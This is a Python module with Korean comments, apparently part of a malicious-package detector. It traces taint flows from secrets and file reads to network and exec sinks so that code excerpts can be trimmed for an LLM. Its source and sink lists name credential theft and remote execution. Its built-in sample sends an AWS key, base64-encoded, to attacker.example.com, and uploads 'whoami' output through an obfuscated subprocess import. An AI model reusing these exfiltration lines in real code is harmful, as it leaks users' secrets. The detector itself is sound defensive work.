"""
Taint Slicing 간이 버전.

근거 논문:
  Taint-Based Code Slicing for LLMs-based Malicious NPM Package Detection (2025)
  https://arxiv.org/html/2512.12313

목적:
  - LLM 에 전체 코드를 넘기는 비용/잡음 줄이기
  - "민감 source -> sink" 데이터 플로우만 추출해 prompt 토큰 수 절감
  - source: 민감 정보 (env, fs.read, secrets)
  - sink:   외부 송출/실행 (http, exec, subprocess)

본 구현은 단순화된 휴리스틱 기반:
  - Python AST 기반 변수 → 호출 흐름 추적
  - 한 함수 / 한 모듈 내에서 source 의 결과가
    sink 인자로 흘러 들어가는지 확인
"""
from __future__ import annotations

import ast
from dataclasses import dataclass, field

from .stage1_entry_point import EntryFile


# ─────────────────── source / sink 정의 ───────────────────

# source 함수 호출 (이 결과가 변수에 담기면 tainted)
TAINT_SOURCES = {
    # 환경변수
    "os.environ.get", "os.environ.__getitem__", "os.getenv",
    # 자격증명/비밀
    "getpass.getuser", "getpass.getpass",
    # 파일 읽기
    "open", "io.open", "Path.read_text", "Path.read_bytes",
    "fs.readFileSync", "fs.readFile",
    # 시스템 정보
    "platform.uname", "socket.gethostname", "os.uname",
    # subprocess output
    "subprocess.check_output", "subprocess.getoutput",
    # process.env (JS — 단순화)
    "process.env",
}

# sink 함수 호출 (taint 가 인자로 들어가면 위험)
TAINT_SINKS = {
    # 네트워크 송신
    "requests.post", "requests.put", "requests.patch",
    "urllib.request.urlopen", "urllib.request.Request",
    "http.client.HTTPSConnection",
    "httpx.post", "httpx.put",
    "socket.send", "socket.sendto",
    # 코드 실행
    "exec", "eval", "compile",
    "subprocess.run", "subprocess.Popen", "subprocess.call",
    "os.system", "os.popen",
    # 역직렬화 RCE (untrusted 입력 시 코드 실행과 동등)
    "pickle.loads", "marshal.loads",
    "yaml.load",  # SafeLoader 미지정 시 RCE
    # JS sinks (단순)
    "fetch", "axios.post", "http.request", "https.request",
    "child_process.exec", "child_process.spawn",
}

# 데이터 변환 단계 (taint propagate)
TAINT_TRANSFORMS = {
    "base64.b64encode", "base64.b64decode",
    "json.dumps", "json.loads",
    "str", "bytes", "encode", "decode",
    "Buffer.from", "atob", "btoa",
}


# ─────────────────── 결과 ───────────────────

@dataclass
class TaintFlow:
    """source 에서 sink 까지의 단일 흐름."""
    source_call: str
    source_line: int
    sink_call: str
    sink_line: int
    tainted_var: str             # 추적된 변수명
    transforms: list[str] = field(default_factory=list)  # 거친 변환들
    file_path: str = ""

    def to_summary(self) -> str:
        chain = [self.source_call] + self.transforms + [self.sink_call]
        return " -> ".join(chain)


@dataclass
class TaintReport:
    flows: list[TaintFlow] = field(default_factory=list)
    error: str | None = None


# ─────────────────── Python AST taint ───────────────────

class _PyTaintAnalyzer(ast.NodeVisitor):
    """함수/모듈 단위 taint 추적.

    매우 단순한 휴리스틱:
      1. Assign 노드에서 RHS 가 source 호출이면 LHS 변수를 tainted 로 표시
      2. Call 인자로 tainted 변수가 들어가면 전파 (transform)
      3. sink 호출 인자로 tainted 변수가 들어가면 flow 기록
    """

    def __init__(self):
        # 변수명 → 마지막으로 흐른 source 정보
        self.tainted: dict[str, dict] = {}
        self.flows: list[TaintFlow] = []

    def _resolve_call_name(self, node) -> str | None:
        if isinstance(node, ast.Name):
            return node.id
        if isinstance(node, ast.Attribute):
            base = self._resolve_call_name(node.value)
            if base:
                return f"{base}.{node.attr}"
            return node.attr
        if isinstance(node, ast.Call):
            # 난독화 패턴: __import__("subprocess").check_output(...)
            # __import__("subprocess") 부분을 'subprocess' 로 평탄화
            inner = node.func
            if (
                isinstance(inner, ast.Name)
                and inner.id == "__import__"
                and node.args
                and isinstance(node.args[0], ast.Constant)
                and isinstance(node.args[0].value, str)
            ):
                return node.args[0].value
            # importlib.import_module("subprocess") 도 동일 처리
            if (
                isinstance(inner, ast.Attribute)
                and inner.attr == "import_module"
                and node.args
                and isinstance(node.args[0], ast.Constant)
                and isinstance(node.args[0].value, str)
            ):
                return node.args[0].value
        return None

    def _collect_names_in_expr(self, node) -> list[str]:
        """단일 표현식에서 사용된 변수명을 재귀로 수집.

        지원 형태:
          - Name              : x
          - Attribute         : obj.attr (root Name 만 수집)
          - Call              : f(args)  / x.method(args) — args, func.value 모두 검사
          - BinOp             : a + b
          - Starred           : *args
          - JoinedStr         : f"..{x}.."
          - Subscript         : x[k]
          - Tuple/List/Set    : (x, y, ...)
          - IfExp             : a if cond else b
        """
        names: list[str] = []
        if node is None:
            return names

        if isinstance(node, ast.Name):
            names.append(node.id)
        elif isinstance(node, ast.Attribute):
            base = self._resolve_call_name(node)
            if base:
                names.append(base.split(".")[0])
        elif isinstance(node, ast.Call):
            for a in node.args:
                names.extend(self._collect_names_in_expr(a))
            if isinstance(node.func, ast.Attribute):
                # 메서드 호출 형태: receiver.method(...) — receiver 추적
                names.extend(self._collect_names_in_expr(node.func.value))
        elif isinstance(node, ast.BinOp):
            names.extend(self._collect_names_in_expr(node.left))
            names.extend(self._collect_names_in_expr(node.right))
        elif isinstance(node, ast.Starred):
            names.extend(self._collect_names_in_expr(node.value))
        elif isinstance(node, ast.JoinedStr):
            for v in node.values:
                if isinstance(v, ast.FormattedValue):
                    names.extend(self._collect_names_in_expr(v.value))
        elif isinstance(node, ast.Subscript):
            names.extend(self._collect_names_in_expr(node.value))
        elif isinstance(node, (ast.Tuple, ast.List, ast.Set)):
            for elt in node.elts:
                names.extend(self._collect_names_in_expr(elt))
        elif isinstance(node, ast.IfExp):
            names.extend(self._collect_names_in_expr(node.body))
            names.extend(self._collect_names_in_expr(node.orelse))
        return names

    def _collect_var_names_in_args(self, args) -> list[str]:
        names: list[str] = []
        for a in args:
            names.extend(self._collect_names_in_expr(a))
        return names

    def visit_Assign(self, node: ast.Assign):
        """`var = source_call(...)` 또는 `var = transform(other_var)`"""
        if len(node.targets) == 1 and isinstance(node.targets[0], ast.Name):
            target = node.targets[0].id
            if isinstance(node.value, ast.Call):
                callee = self._resolve_call_name(node.value.func)
                if callee in TAINT_SOURCES:
                    self.tainted[target] = {
                        "source": callee,
                        "line": getattr(node, "lineno", 0),
                        "transforms": [],
                    }
                elif callee in TAINT_TRANSFORMS or (callee and callee.endswith((".encode", ".decode")) ):
                    # 변환 — 입력 인자가 tainted 면 출력도 tainted
                    arg_names = self._collect_var_names_in_args(node.value.args)
                    for name in arg_names:
                        if name in self.tainted:
                            info = dict(self.tainted[name])
                            info["transforms"] = info["transforms"] + [callee]
                            self.tainted[target] = info
                            break

            # 단순 변수 할당 var2 = var1
            elif isinstance(node.value, ast.Name) and node.value.id in self.tainted:
                self.tainted[target] = self.tainted[node.value.id]

        self.generic_visit(node)

    def visit_Call(self, node: ast.Call):
        callee = self._resolve_call_name(node.func)
        if callee in TAINT_SINKS:
            arg_names = self._collect_var_names_in_args(node.args)
            # keyword 인자도 검사
            for kw in node.keywords:
                if isinstance(kw.value, ast.Name):
                    arg_names.append(kw.value.id)
                elif isinstance(kw.value, ast.Dict):
                    for v in kw.value.values:
                        if isinstance(v, ast.Name):
                            arg_names.append(v.id)
            for name in arg_names:
                if name in self.tainted:
                    info = self.tainted[name]
                    self.flows.append(TaintFlow(
                        source_call=info["source"],
                        source_line=info["line"],
                        sink_call=callee,
                        sink_line=getattr(node, "lineno", 0),
                        tainted_var=name,
                        transforms=info["transforms"],
                    ))
                    break
        self.generic_visit(node)


def analyze_python(source: str) -> TaintReport:
    report = TaintReport()
    try:
        tree = ast.parse(source)
    except SyntaxError as e:
        report.error = f"SyntaxError: {e}"
        return report

    analyzer = _PyTaintAnalyzer()
    analyzer.visit(tree)
    report.flows = analyzer.flows
    return report


# ─────────────────── 통합 ───────────────────

def analyze_file(f: EntryFile) -> TaintReport:
    if f.language == "python":
        rpt = analyze_python(f.content)
        for flow in rpt.flows:
            flow.file_path = f.path
        return rpt
    # JS 는 추후 (tree-sitter 기반) 추가
    return TaintReport()


def slice_for_llm(
    source: str,
    flows: list[TaintFlow],
    max_lines_per_flow: int = 10,
) -> str:
    """탐지된 흐름의 코드 발췌만 추려 LLM 프롬프트에 사용.
    각 flow 의 source_line ~ sink_line 범위 내 라인을 추출.
    """
    if not flows:
        return ""
    lines = source.splitlines()
    extracted: list[str] = []

    for i, flow in enumerate(flows, 1):
        a = max(1, min(flow.source_line, flow.sink_line) - 2)
        b = min(len(lines), max(flow.source_line, flow.sink_line) + 2)
        extracted.append(f"\n--- Flow #{i}: {flow.to_summary()} ---")
        for j in range(a, b + 1):
            extracted.append(f"  L{j:>3}  {lines[j-1]}")

    return "\n".join(extracted)


# ─────────────────── CLI ───────────────────

if __name__ == "__main__":
    sample = '''
import os
import base64
import requests

# 정상 — taint 없음
greeting = "hello"
print(greeting)

# 흐름 1: env -> base64 -> http.post
secret = os.environ.get("AWS_KEY")
encoded = base64.b64encode(secret.encode())
requests.post("https://attacker.example.com", data=encoded)

# 흐름 2: file read -> exec
with open("/tmp/payload") as f:
    pass  # 단순화: with-open 은 이 분석에서 잡지 못함

# 흐름 3: subprocess output -> upload
out = __import__("subprocess").check_output(["whoami"])
requests.put("https://x.com", data=out)

# 정상: 단순 string concat
url = "https://example.com/" + "path"
print(url)
'''
    rpt = analyze_python(sample)
    print(f"flows: {len(rpt.flows)}")
    for f in rpt.flows:
        print(f"  {f.to_summary()}")
        print(f"    var={f.tainted_var}, source@L{f.source_line}, sink@L{f.sink_line}")

    print("\n=== LLM slice ===")
    print(slice_for_llm(sample, rpt.flows))
